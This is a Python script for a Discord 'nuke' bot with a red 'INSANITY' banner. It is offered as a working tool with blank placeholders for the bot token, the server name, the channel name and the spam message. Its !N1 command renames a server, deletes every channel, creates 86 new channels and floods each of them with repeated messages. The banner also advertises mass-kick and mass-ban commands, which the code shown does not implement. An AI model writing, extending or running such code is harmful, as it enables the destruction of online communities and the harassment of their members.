import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

import colorama
from colorama import Fore, Back, Style
colorama.init()

TOKEN = ""

ServerName = ""
ChannelName = ""
Message = ""

@bot.event
async def on_ready():
    print(f'''
    
{Fore.RED} ██▓ ███▄    █   ██████  ▄▄▄       ███▄    █  ██▓▄▄▄█████▓▓██   ██▓
{Fore.RED}▓██▒ ██ ▀█   █ ▒██    ▒ ▒████▄     ██ ▀█   █ ▓██▒▓  ██▒ ▓▒ ▒██  ██▒
{Fore.RED}▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░  ▒██ ██░
{Fore.RED}░██░▓██▒  ▐▌██▒  ▒   ██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░░ ▓██▓ ░   ░ ▐██▓░
{Fore.RED}░██░▒██░   ▓██░▒██████▒▒ ▓█   ▓██▒▒██░   ▓██░░██░  ▒██▒ ░   ░ ██▒▓░
{Fore.RED}░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓    ▒ ░░      ██▒▒▒ 
{Fore.RED}▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░    ░     ▓██ ░▒░ 
{Fore.RED} ▒ ░   ░   ░ ░ ░  ░  ░    ░   ▒      ░   ░ ░  ▒ ░  ░       ▒ ▒ ░░  
{Fore.RED} ░           ░       ░        ░  ░         ░  ░            ░ ░     
{Fore.RED}░ ░      
{Fore.RED}
{Fore.RED}
{Fore.RED}

{Fore.LIGHTCYAN_EX} Client: {Fore.LIGHTCYAN_EX} {bot.user.name}
{Fore.LIGHTCYAN_EX} Verison: {Fore.LIGHTCYAN_EX} Beta

{Fore.RED} !N1 to nuke
{Fore.RED} !K2 to kick everyone
{Fore.RED} !B3 to ban everyone
''')

@bot.command()
async def N1(ctx):

    await ctx.guild.edit(name=f'{ServerName}') 
    print("Server name changed")

    for c in ctx.guild.channels:
        await c.delete()
        print("Deleted Channel",c)

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel(f'{ChannelName}')
        n = n+1
        print("Channel Created")

    for c in ctx.guild.text_channels:
             await c.send(f'{Message}') 
             await c.send(f'{Message}')
             await c.send(f'{Message}')
             await c.send(f'{Message}')
             await c.send(f'{Message}')


bot.run(TOKEN)
